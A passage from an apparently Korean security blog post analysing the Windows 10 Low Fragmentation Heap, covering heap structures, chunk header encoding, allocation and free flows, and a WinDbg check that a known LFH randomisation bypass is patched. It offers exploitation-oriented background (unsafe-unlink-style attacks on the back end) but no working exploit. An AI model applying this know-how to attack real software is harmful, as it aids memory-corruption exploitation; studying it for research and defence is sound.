<strong>ntdll.dll</strong>에서 차이를 비교해 봤을때 아래와 같이 큰 변화가 없어 괜찮을 것이라고 판단했습니다.</p> <p><img src="/assets/images/lazyfragmentationheap-pic2.png" alt="ntdll bindiff" /></p> <h1 id="3-분석">3. 분석</h1> <p>Windows Heap 할당 메커니즘은 기존에 존재하던 <strong>NT Heap</strong>과, Windows 10부터 추가된 <strong>Segment Heap</strong>으로 나뉘어 집니다.</p> <p><strong>Segment Heap</strong>은 이미 Edge Browser나 대부분의 UWP 앱에서 사용되고 있으며 굉장히 흥미로운 주제이지만, 이번에 분석해볼 LFH는 Windows Vista 시절부터 사용되던 <strong>NT Heap</strong>에 포함된 기능이기 때문에 다음에 기회가 된다면 분석해보겠습니다.</p> <p><strong>NT Heap</strong>은 크게 Front-End와 Back-End로 나눠지는데, Front-End가 LFH를 의미합니다. LFH가 비활성화되어 있다면 Heap 메모리 할당 시 바로 Back-End로 넘어가게 됩니다.</p> <p>Front-End에 해당하는 LFH는 실제 Heap 메모리 할당에는 관여하지 않고, <strong>Low Fragmentation Heap</strong>이라는 이름 그대로 할당된 Heap 메모리간의 <a href="https://ko.wikipedia.org/wiki/%EB%8B%A8%ED%8E%B8%ED%99%94">단편화</a>를 완화함으로서 보다 더 효율적으로 Heap 메모리를 관리하기 위해 사용됩니다.</p> <p>LFH는 아래의 코드처럼 동일한 크기의 Heap 메모리를 여러개 할당해 주다 보면 자동으로 활성화 됩니다. 여기서 주의할 점은 할당요청한 Heap 메모리의 크기가 16KB( 0x4000 ) 보다 클 경우, LFH는 해당 메모리를 관리하지 않습니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">LPVOID</span> <span class="o">*</span><span class="n">ptr_arr</span><span class="p">[</span><span class="mi">80</span><span class="p">];</span>
        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>

        <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">80</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
                <span class="n">ptr_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"[+] find Heap base address using </span><span class="se">\"</span><span class="s">!heap -x %p</span><span class="se">\"</span><span class="s"> command</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ptr_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[+] check if LFH was enabled</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">getchar</span><span class="p">();</span>

        <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">80</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
                <span class="n">free</span><span class="p">(</span><span class="n">ptr_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><img src="/assets/images/lazyfragmentationheap-pic3.png" alt="LFH enable/disable" /></p> <p>( 사족이지만, Windows 에서 할당된 모든 Heap 메모리는 _HEAP 구조체를 통해 관리되는데, <a href="https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate">HeapCreate()</a> 함수로 생성한 private heap을 사용하지 않고 위의 테스트 코드처럼 표준 <strong>malloc()</strong> 함수를 사용해 할당하면 <a href="https://ko.wikipedia.org/wiki/%ED%94%84%EB%A1%9C%EC%84%B8%EC%8A%A4_%ED%99%98%EA%B2%BD_%EB%B8%94%EB%A1%9D">PEB</a>에 보관되어 있는 기본 Heap 메모리를 사용합니다 )</p> <p><img src="/assets/images/lazyfragmentationheap-pic4.png" alt="_PEB-&gt;ProcessHeap" /></p> <p>LFH가 활성화되면 <strong>_HEAP-&gt;FrontEndHeap</strong>에 새로 할당된 LFH의 주소가 들어가고, <strong>_HEAP-&gt;FrontEndHeapType</strong>에 2가 들어가 있는데 이 값은 <a href="https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapqueryinformation">HeapQueryInformation()</a> 함수를 통해 읽어들여 LFH의 활성화 여부를 구별할 때 사용할 수 있습니다.</p> <p><strong>_HEAP-&gt;FrontEndHeap</strong> 이외에도 LFH가 사용하는 값들을 가지고 있는 구조체들은 개략적으로 아래의 그림과 같이 연결되어 있습니다.</p> <p><img src="/assets/images/lazyfragmentationheap-pic5.png" alt="NT Heap Structure" /></p> <ul> <li><strong>서로 다른 구조체 멤버에서 출발한 화살표들이 같은 구조체를 가리키는 것은 단지 그 멤버들이 같은 구조체를 사용할 뿐 실제로 같은 값을 가진다는 건 아닙니다</strong></li> <li><strong>Linked List로 연결된 다음 구조체를 가리키는 멤버에는 화살표를 사용하지 않았습니다</strong></li> <li><strong>포인터가 아닌 구조체 멤버는 이름 밑에 구조체 타입을 명시했습니다</strong></li> </ul> <p>LFH를 이해하기 위해선 위와 같이 다양한 객체들이 어떤 기능을 수행하는지 먼저 알아볼 필요가 있다고 생각해서, 여러 문서를 참조해 아래와 같이 정리해봤는데 혹시 잘못되었거나 부족한 부분이 있다면 최하단의 Disqus 댓글로 알려주시기 바랍니다.</p> <h2 id="용어-정리">용어 정리</h2> <ul> <li><strong>Bucket</strong> : LFH에게 할당받은 Heap chunk들을 크기로 분류해 묶어놓은 것이며, <strong>UserBlock</strong>이라고도 부름.</li> <li><strong>SubSegment</strong> : LFH가 Heap 메모리를 효율적으로 관리하기 위해 사용하는 <strong>_HEAP_SUBSEGMENT</strong> 구조체를 의미하며, Heap chunk 크기가 다르면 서로 다른 SubSegment가 사용됨.</li> </ul> <h2 id="31-_heap">3.1. <a href="https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/1903%2019H1%20(May%202019%20Update)/_HEAP">_HEAP</a></h2> <p>: 할당된 Heap 메모리 영역을 관리하기 위해 사용되는 가장 핵심적인 구조체.</p> <ul> <li>EncodeFlagMask : Heap chunk header가 인코딩되었는지 판단하기 위해 사용되는 값, Heap 초기화 시 0x100000으로 설정됨</li> <li>Encoding : Heap header들이 변조 되는것을 방지하기 위한 XOR 인코딩을 위해 사용됨</li> <li>BlocksIndex : Back-End에서 Heap chunk들을 관리하기 위해 사용되는 <strong>_HEAP_LIST_LOOKUP</strong> 구조체를 가리킴</li> <li>FreeLists : glibc에서 쓰이는 <a href="https://github.com/bminor/glibc/blob/d614a75/malloc/malloc.c#L1491-L1501">unsorted bin</a>과 비슷하게 할당 해제된 Heap chunk의 <strong>_HEAP_ENTRY</strong> 구조체를 가리킴</li> <li>FrontEndHeap : LFH가 비활성화되어 있으면 0으로 초기화된 상태이지만, LFH가 활성화되면 할당된 <strong>_LFH_HEAP</strong> 구조체를 가리킴</li> </ul> <h2 id="32-_heap_entry">3.2. <a href="https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/1909%2019H2%20(November%202019%20Update)/_HEAP_ENTRY">_HEAP_ENTRY</a></h2> <p>: glibc에서 쓰이는 <a href="https://github.com/bminor/glibc/blob/d614a75/malloc/malloc.c#L1079-L1083">malloc_chunk 구조체의 header 부분</a>처럼 할당된 Heap chunk의 header 역할을 하는 구조체.<br /> ( LFH냐 아니냐에 따라 서로 다른 방식으로 XOR 인코딩되어 있기 때문에, 실제 값을 알기 위해선 디코딩 과정이 필요함 )</p> <h3 id="non-lfh-chunk">Non-LFH chunk</h3> <p><img src="/assets/images/lazyfragmentationheap-pic6.png" alt="decoding _HEAP_ENTRY" /></p> <ul> <li>PreviousBlockPrivateData : 이전에 할당되어 있던 Heap chunk의 값을 보관하는데, 보통 0으로 초기화되어 있음</li> <li>Size : <strong>_HEAP_ENTRY</strong> 구조체를 포함한 Heap chunk의 크기이며, 0x10을 곱해야 원래 값을 구할 수 있음</li> <li>Flags : Heap chunk가 사용중( BUSY, 1 )인지, 할당해제된 상태( FREE, 0 )인지 식별할 때 사용됨</li> <li>SmallTagIndex : ( <strong>PreviousBlockPrivateData</strong>를 제외한 )<strong>_HEAP_ENTRY</strong> 구조체 앞부분 3 bytes를 XOR한 값을 보관하고 있으며, header의 무결성을 검증하기 위해 사용됨</li> <li>PreviousSize : 이전에 할당된 Heap chunk의 크기이며, 0x10을 곱해야 원래 값을 구할 수 있음</li> <li>UnusedBytes : 할당 후 남은 메모리 크기를 명시할 때 사용되는데, 이 멤버의 8번째 bit가 1일 경우( UnusedBytes OR 0x80 == 1 ) 이 chunk는 LFH chunk로 인식됨</li> </ul> <h3 id="lfh-chunk">LFH chunk</h3> <p>LFH chunk의 경우 <strong>SubSegmentCode</strong>에 아래와 같은 XOR 연산의 결과값을 보관합니다.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>((&amp;_HEAP_ENTRY - &amp;_HEAP_USERDATA_HEADER) &lt;&lt; 0xC) ^
(&amp;_HEAP_ENTRY &gt;&gt; 4) ^
&amp;_HEAP ^
pLFHKey
</code></pre></div></div> <p>이 결과값을 통해 아래와 같이 해당 LFH chunk의 <strong>_HEAP_USERDATA_HEADER</strong> 구조체와 <strong>_HEAP_SUBSEGMENT</strong> 구조체를 찾을 수 있습니다.</p> <p><img src="/assets/images/lazyfragmentationheap-pic7.png" alt="decoding _HEAP_ENTRY of LFH chunk" /></p> <ul> <li>SubSegmentCode : <strong>_HEAP_USERDATA_HEADER</strong> 구조체와 <strong>_HEAP_SUBSEGMENT</strong> 구조체를 찾기 위해 사용됨</li> <li>PreviousSize : ( 이름때문에 헷갈리긴 하지만 ) <strong>_HEAP_USERDATA_HEADER-&gt;BitmapData</strong>에서 해당 Heap chunk와 연결된 bit를 찾는 index값으로 사용됨</li> <li>UnusedBytes : 할당 후 남은 메모리 크기를 명시할 때 사용되는데, 이 멤버의 8번째 bit가 1일 경우( UnusedBytes OR 0x80 == 1 ) 이 chunk는 LFH chunk로 인식됨</li> </ul> <h2 id="33-_heap_list_lookup">3.3. <a href="https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/1909%2019H2%20(November%202019%20Update)/_HEAP_LIST_LOOKUP">_HEAP_LIST_LOOKUP</a></h2> <p>: Back-End에서 Heap chunk를 관리하기 위해 사용하는 구조체.<br /> ( _HEAP-&gt;BlocksIndex )</p> <ul> <li>ExtendedLookup : 다음 <strong>_HEAP_LIST_LOOKUP</strong> 구조체를 가리키는 주소가 들어있음</li> <li>ArraySize : Heap chunk들의 최대 크기이며, 0x10을 곱해야 원래 값을 구할 수 있음</li> <li>ItemCount : 관리중인 Heap chunk들의 개수</li> <li>OutOfRangeItems : 관리할 수 있는 최대 크기를 넘어선 Heap chunk들의 개수</li> <li>BaseIndex : 현재 <strong>_HEAP_LIST_LOOKUP</strong> 구조체가 관리하고 있는 Heap chunk들의 시작 index 값이며 index의 범위는 현재 <strong>_HEAP_LIST_LOOKUP</strong>의 BaseIndex 부터 <strong>ExtendedLookup</strong>이 가리키는 <strong>_HEAP_LIST_LOOKUP</strong>의 BaseIndex 까지이며, <strong>ListHints</strong>가 할당해제된 Heap chunk를 탐색할 때에도 사용됨</li> <li>ListHead : 할당해제된 Heap chunk들을 관리하는 Double Linked List의 Head 역할을 하며, <strong>_HEAP-&gt;FreeLists</strong>를 가리킴</li> <li>ListInUseUlong : <strong>ListHints</strong>가 가리키는 Heap chunk들 중 어떤게 사용가능한지 가리킴</li> <li>ListHints : 할당해제된 Heap chunk들 중 같은 크기들끼리 연결된 Double Linked List를 가리키는 주소의 배열 역할을 함</li> </ul> <h2 id="34-_lfh_heap">3.4. <a href="http://terminus.rewolf.pl/terminus/structures/ntdll/_LFH_HEAP_x64.html">_LFH_HEAP</a></h2> <p>: LFH chunk들을 관리하기 위해 사용되는 구조체.<br /> ( _HEAP-&gt;FrontEndHeap )</p> <ul> <li>Heap : 해당 <strong>_LFH_HEAP</strong> 구조체를 가리키는 <strong>_HEAP</strong> 구조체의 시작주소를 가리킴</li> <li>Buckets : 할당요청을 받은 Heap chunk 크기와 일치하는 메모리 영역을 찾을 때 사용됨</li> <li>SegmentInfoArrays : Heap chunk들을 크기로 분류해 각기 다른 SubSegment( <strong>_HEAP_SUBSEGMENT</strong> )로 관리하기 위해 사용됨</li> <li>LocalData : <a href="http://terminus.rewolf.pl/terminus/structures/ntdll/_HEAP_LOCAL_DATA_x64.html">_HEAP_LOCAL_DATA-&gt;LowFragHeap</a>을 읽어들여 LFH의 주소를 알아내기 위해 사용됨</li> </ul> <h2 id="35-_heap_bucket">3.5. <a href="http://terminus.rewolf.pl/terminus/structures/ntdll/_HEAP_BUCKET_x64.html">_HEAP_BUCKET</a></h2> <p>: LFH가 Heap chunk를 할당할때 참조하기 위해 사용되며 Bucket을 관리하기 위해 사용되는 구조체.<br /> ( _LFH_HEAP-&gt;Buckets )</p> <ul> <li>BlockUnits : 해당 Bucket이 가리키는 Heap chunk의 크기를 찾고자 할 때 사용되며, 0x10을 곱해야 실제 크기를 구할 수 있음</li> <li>SizeIndex : 해당 Bucket의 index값을 가지고 있으며, <strong>_LFH_HEAP-&gt;SegmentInfoArrays</strong> 배열에서의 index값으로도 사용됨</li> </ul> <h2 id="36-_heap_local_segment_info">3.6. <a href="http://terminus.rewolf.pl/terminus/structures/ntdll/_HEAP_LOCAL_SEGMENT_INFO_x64.html">_HEAP_LOCAL_SEGMENT_INFO</a></h2> <p>: SubSegment를 관리하기 위해 사용되는 구조체.<br /> ( _LFH_HEAP-&gt;SegmentInfoArrays )</p> <ul> <li>LocalData : <strong>_LFH_HEAP-&gt;LocalData</strong>를 가리키며, 이를 참조해 <strong>_LFH_HEAP</strong>의 시작주소를 찾을 수 있음</li> <li>ActiveSubsegment : LFH의 메모리 할당 요청을 처리하는데 사용될 SubSegment를 가리킴</li> <li>CachedItems : <strong>ActiveSubsegment</strong>가 가리키는 SubSegment에서 관리할 수 있는 Heap chunk의 개수를 초과하면 이 배열에서 새로운 SubSegment를 가져옴</li> <li>BucketIndex : <strong>ActiveSubsegment</strong>가 가리키는 SubSegment와 연결된 <strong>_LFH_HEAP-&gt;Buckets</strong>의 index값( =<strong>_HEAP_BUCKET-&gt;SizeIndex</strong> )을 가지고 있음</li> </ul> <h2 id="37-_heap_subsegment">3.7. <a href="http://terminus.rewolf.pl/terminus/structures/ntdll/_HEAP_SUBSEGMENT_x64.html">_HEAP_SUBSEGMENT</a></h2> <p>: LFH가 할당한 Heap chunk들을 각각의 크기별로 관리하기 위해 사용되는 구조체.<br /> ( _HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment, _HEAP_LOCAL_SEGMENT_INFO-&gt;CachedItems )</p> <ul> <li>LocalInfo : 해당 SubSegment를 가리키는 <strong>_HEAP_LOCAL_SEGMENT_INFO</strong> 구조체의 시작주소를 가리킴</li> <li>UserBlocks : 해당 SubSegment와 연결된 UserBlock의 시작주소를 가리킴</li> <li>AggregateExchg : UserBlock에 남아있는 할당해제된 Heap chunk의 개수를 참조할 때 사용됨</li> <li>BlockSize : UserBlock에 할당될 Heap chunk 크기를 보관하고 있으며, 0x10을 곱해야 실제 크기를 구할 수 있음</li> <li>BlockCount : UserBlock에 할당되어 있는 Heap chunk의 개수를 보관하고 있음</li> <li>SizeIndex : <strong>_HEAP_LOCAL_SEGMENT_INFO-&gt;BucketIndex</strong>와 같은 값을 보관하고 있음</li> </ul> <h2 id="38-_heap_userdata_header">3.8. <a href="http://terminus.rewolf.pl/terminus/structures/ntdll/_HEAP_USERDATA_HEADER_x64.html">_HEAP_USERDATA_HEADER</a></h2> <p>: UserBlock의 시작부분에 위치해 UserBlock의 header역할을 하는 구조체.<br /> ( _HEAP_SUBSEGMENT-&gt;UserBlocks )</p> <ul> <li>SubSegment : 해당 UserBlock과 연결된 SubSegment의 시작주소를 가리킴</li> <li>EncodedOffsets : Heap chunk header의 무결성을 검증할 때 사용되며, 아래와 같은 XOR 연산의 결과값이 보관되어 있음 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(sizeof(_HEAP_USERDATA_HEADER)+8) | ((_HEAP_BUCKET-&gt;BlockUnits * 0x10) &lt;&lt; 16) ^
pLFHKey ^
&amp;_HEAP_USERBDATA_HEADER ^
&amp;_LFH_HEAP
</code></pre></div> </div> </li> <li>BusyBitmap : <strong>BusyBitmap-&gt;SizeOfBitMap</strong>은 <strong>_HEAP_SUBSEGMENT-&gt;BlockCount</strong>와 동일한 값을 가지고 있고, <strong>BusyBitmap-&gt;Buffer</strong>가 가리키는 bitmap( <strong>_HEAP_USERDATA_HEADER-&gt;BitmapData</strong>를 가리킴 )에서 Heap chunk의 할당여부를 확인할 수 있음</li> <li>BitmapData : Heap chunk의 할당 여부를 확인하기 위한 8 bytes짜리 Bitmap 데이터를 가지고 있으며, 특정 index에 해당하는 Heap chunk가 할당되서 사용중이면 해당 index의 bit는 1( BUSY ), 할당해제되었거나 할당된 적이 없으면 0( FREE )으로 표기함</li> </ul> <h2 id="39-_interlock_seq">3.9. <a href="http://terminus.rewolf.pl/terminus/structures/ntdll/_INTERLOCK_SEQ_x64.html">_INTERLOCK_SEQ</a></h2> <p>: 할당 혹은 할당해제된 Heap chunk의 개수를 구할 때 주로 참조하는 구조체.<br /> ( _HEAP_SUBSEGMENT-&gt;AggregateExchg )</p> <ul> <li>Depth : 초기값으로 <strong>_HEAP_SUBSEGMENT-&gt;BlockCount</strong>와 동일한 값을 가지고 있으며 새로운 Heap chunk를 할당하면 1 감소하고 할당해제 하면 1 증가함</li> </ul> <p>LFH와 관련된 구조체들 중에서 중요한 멤버들에 대해서만 간추려 정리했는데도 꽤 많은 시간이 필요했습니다.</p> <p>Windows Heap을 처음 공부하는 입장에선 각각의 구조체들이 실제로 어떤 방식으로 사용되는지 좀 헷갈릴 수 있기 때문에, LFH가 관리하지 않는 일반 Heap chunk와 구분해 Heap 메모리 할당 그리고 할당해제 과정이 어떤식으로 동작하는지 아래와 같이 간략하게 정리했습니다.</p> <h2 id="310-allocate-and-free-non-lfh-chunk">3.10. Allocate and Free Non-LFH chunk</h2> <h3 id="allocate">Allocate</h3> <p>Non-LFH chunk의 경우, 할당요청을 받은 Heap chunk의 크기에 따라 메모리 관리에 약간의 차이가 존재합니다.</p> <h4 id="size---_heap-virtualmemorythreshold--0x10-">size &lt;= ( _HEAP-&gt;VirtualMemoryThreshold * 0x10 )</h4> <ol> <li>만약 요청받은 Heap chunk의 크기가 0x4000 이하라면 LFH가 활성화되어 있는지 검사한다.</li> <li>요청받은 Heap chunk의 크기가 <strong>_HEAP-&gt;BlockIndex</strong>가 가리키는 <strong>_HEAP_LIST_LOOKUP</strong>의 <strong>ArraySize</strong>보다 큰지 확인하고, 만약 크다면 <strong>_HEAP_LIST_LOOKUP-&gt;ExtendedLookup</strong>이 가리키는 구조체의 <strong>ArraySize</strong>와 비교해가며 유효한 구조체를 찾는다.</li> <li><strong>_HEAP_LIST_LOOKUP-&gt;ListHint</strong>를 탐색하며 알맞는 크기의 Heap 메모리 영역을 찾아 반환해준다.</li> </ol> <h4 id="size---_heap-virtualmemorythreshold--0x10--1">size &gt; ( _HEAP-&gt;VirtualMemoryThreshold * 0x10 )</h4> <ol> <li><a href="https://docs.microsoft.com/en-us/previous-versions/ff566416(v%3Dvs.85)">ZwAllocateVirtualMemory()</a> 함수로 메모리를 할당받아 <strong>_HEAP-&gt;VirtualAllocdBlocks</strong>에 삽입한다.<br /> ( 위와 같은 방식으로 할당된 Heap chunk는 <strong>_HEAP_ENTRY</strong> 대신 <a href="https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/1909%2019H2%20(November%202019%20Update)/_HEAP_VIRTUAL_ALLOC_ENTRY">_HEAP_VIRTUAL_ALLOC_ENTRY</a> 구조체를 header로 사용함 )</li> </ol> <h3 id="free">Free</h3> <h4 id="size---_heap-virtualmemorythreshold--0x10--2">size &lt;= ( _HEAP-&gt;VirtualMemoryThreshold * 0x10 )</h4> <ol> <li><strong>_HEAP_ENTRY-&gt;UnusedBytes</strong>로 LFH가 관리하던 Heap chunk인지 검사한다.</li> <li>이전 혹은 이후에 할당된 Heap chunk가 할당해제된 상태라면 할당해제할 해당 chunk와 합친 뒤 합친 크기를 새로 업데이트한다.</li> <li>만약 합쳐진 Heap chunk가 <strong>_HEAP-&gt;FreeLists</strong>의 시작 혹은 끝부분에 삽입할 수 있다면 삽입하고, 안된다면 <strong>_HEAP_LIST_LOOKUP-&gt;ListHints</strong>에 삽입한다.<br /> ( glibc에서 발생하는 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsafe_unlink.c">Unsafe Unlink</a> 기법과 매우 유사한 형태의 공격이 가능함 )</li> </ol> <h4 id="size---_heap-virtualmemorythreshold--0x10--3">size &gt; ( _HEAP-&gt;VirtualMemoryThreshold * 0x10 )</h4> <ol> <li>Heap header의 무결성을 검사한 후, <strong>_HEAP-&gt;VirtualAllocdBlocks</strong>에서 해당 Heap chunk 주소를 제거한 뒤 <strong>ntdll!RtlpSecMemFreeVirtualMemory</strong> 함수로 할당해제한다.</li> </ol> <h2 id="311-allocate-and-free-lfh-chunk">3.11. Allocate and Free LFH chunk</h2> <h3 id="allocate-1">Allocate</h3> <ol> <li><strong>_LFH_HEAP-&gt;Buckets</strong>를 탐색하며 할당하고자 하는 크기에 맞는 Buckets의 <strong>SizeIndex</strong>를 구해 <strong>_LFH_HEAP-&gt;SegmentInfoArrays</strong> 배열의 index로 시용해 알맞는 SubSegment를 구한다.</li> <li><strong>_HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment</strong>가 가리키는 SubSegment의 <strong>Depth</strong>를 읽어들여 할당가능한 Heap chunk가 있는지 확인하고, 만약 없다면 <strong>_HEAP_LOCAL_SEGMENT_INFO-&gt;CachedItems</strong>에서 새로운 SubSegment를 가져온다.</li> <li><strong>_HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment-&gt;AggregateExchg-&gt;Depth</strong>를 1 감소시킨다.</li> <li><strong>ntdll!RtlpLowFragHeapRandomData</strong>에서 임의의 위치에 있는 난수 1 byte를 읽어들여 Heap chunk의 index값으로 사용한다.</li> <li><strong>_HEAP_USERDATA_HEADER-&gt;BusyBitmap</strong>이 가리키는 Bitmap의 해당 index에 Heap chunk를 할당할 수 있는지 확인하고 만약 가능하다면 할당한 뒤 주소를 반환해주고 아니면 인접한 다른 index를 탐색한다.</li> </ol> <h3 id="free-1">Free</h3> <ol> <li>header를 디코딩해 <strong>_HEAP_USERDATA_HEADER</strong>와 <strong>_HEAP_SUBSEGMENT</strong>의 주소를 구한다.</li> <li><strong>_HEAP_ENTRY-&gt;UnusedBytes</strong>의 값을 0x80으로 수정한다.</li> <li>Bitmap에서 할당해제할 Heap chunk와 index가 같은 bit를 0으로 수정하고, <strong>_HEAP_SUBSEGMENT-&gt;AggregateExchg-&gt;Depth</strong>를 1 증가시킨다.</li> </ol> <p>LFH가 활성화되면 보안적인 관점에서 가장 눈에 띄는 차이점은 Heap chunk간의 위치가 Non-Deterministic, 쉽게 말해 내가 할당요청을 보낸 Heap chunk가 어디에 위치할 지 모른단 점입니다.</p> <p>보통 우리에게 익숙한 glibc에서의 Heap 익스플로잇 기법들은 대부분 같은 크기인 Heap chunk들간의 크기와 서로간의 간격을 알 수 있어 뒤에 위치한 Heap chunk의 header나 ( 만약 뒤에 있는 Heap chunk가 할당해제된 상태면 )FD와 BK를 조작하거나 Top chunk를 조작하는 형태로 이루어집니다.</p> <p>LFH가 비활성화된 Heap chunk라면 앞서 말한바와 같이 이러한 기법을 응용해 사용할 수도 있겠지만, LFH는 같은 크기로 할당된 Heap chunk들이 서로 어디에 위치해 있는지 알 수 없기 때문에 약간의 어려움이 있습니다.</p> <p><a href="https://twitter.com/AmarSaar">Saar Amar</a>이 전에 Heap chunk를 할당하기 위해 <strong>ntdll!RtlpLowFragHeapRandomData</strong>에서 랜덤한 index를 읽어들일 때 해당 데이터가 한번 설정된 후 계속 고정되어 있고, 데이터를 읽어들이는 순서가 순차적이라는 점을 이용해 <a href="https://github.com/saaramar/Deterministic_LFH">LFH의 Non-Deterministic한 특징을 우회할 수 있는 취약점</a>을 찾은 적은 있지만 이 취약점은 Windows 10 Version 16179부터 패치되었기 때문에 아래와 같이 취약점이 발생하지 않습니다.</p> <p><img src="/assets/images/lazyfragmentationheap-pic8.png" alt="vuln mitigated" /></p> <p>이 부분은 간단한 테스트 코드로 확인해 보실 수 있습니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
</span>
<span class="cp">#define SIZE 0x80
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">LPVOID</span> <span class="o">*</span><span class="n">ptr_arr</span><span class="p">[</span><span class="mh">0x112</span><span class="p">];</span>
	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">hHeap</span><span class="p">;</span>

	<span class="n">hHeap</span> <span class="o">=</span> <span class="n">HeapCreate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

	<span class="c1">// activate LFH</span>
	<span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x12</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
		<span class="n">ptr_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hHeap</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] create BP print hook NOW</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>

	<span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mh">0x12</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x112</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
		<span class="n">ptr_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">HeapAlloc</span><span class="p">(</span><span class="n">hHeap</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] All allocated heap chunks are going to be de-allocated"</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>

	<span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x112</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
		<span class="n">HeapFree</span><span class="p">(</span><span class="n">hHeap</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ptr_arr</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>

    <span class="n">HeapDestroy</span><span class="p">(</span><span class="n">hHeap</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="cm">/*
ntdll.dll version == 10.0.18362.418

0:001&gt; bp ntdll+3C4AD ".printf \"currIdx=0x%p\\r\\n\", @rax; g"
0:001&gt; g
currIdx=0x0000000000000010
currIdx=0x0000000000000011
currIdx=0x0000000000000012
currIdx=0x0000000000000013
currIdx=0x0000000000000014
currIdx=0x0000000000000015
currIdx=0x0000000000000016
currIdx=0x0000000000000017
currIdx=0x0000000000000018
currIdx=0x0000000000000019
currIdx=0x000000000000001a
currIdx=0x000000000000001b
currIdx=0x000000000000001c
currIdx=0x000000000000001d
currIdx=0x000000000000001e
currIdx=0x000000000000001f
currIdx=0x0000000000000020
currIdx=0x0000000000000021
currIdx=0x0000000000000022
currIdx=0x0000000000000023
currIdx=0x0000000000000024
currIdx=0x0000000000000025
currIdx=0x0000000000000026
currIdx=0x0000000000000027
currIdx=0x0000000000000028
currIdx=0x0000000000000029
currIdx=0x000000000000002a
currIdx=0x000000000000002c
currIdx=0x000000000000002d
currIdx=0x000000000000002e
currIdx=0x000000000000002f
currIdx=0x0000000000000030
currIdx=0x0000000000000031
currIdx=0x0000000000000032
currIdx=0x0000000000000033
currIdx=0x0000000000000034
currIdx=0x0000000000000035
currIdx=0x0000000000000036
currIdx=0x0000000000000037
currIdx=0x0000000000000038
currIdx=0x0000000000000039
currIdx=0x000000000000003a
currIdx=0x000000000000003b
currIdx=0x000000000000003c
currIdx=0x000000000000003d
currIdx=0x000000000000003e
currIdx=0x000000000000003f
currIdx=0x0000000000000040
currIdx=0x0000000000000041
currIdx=0x0000000000000042
currIdx=0x0000000000000043
currIdx=0x0000000000000044
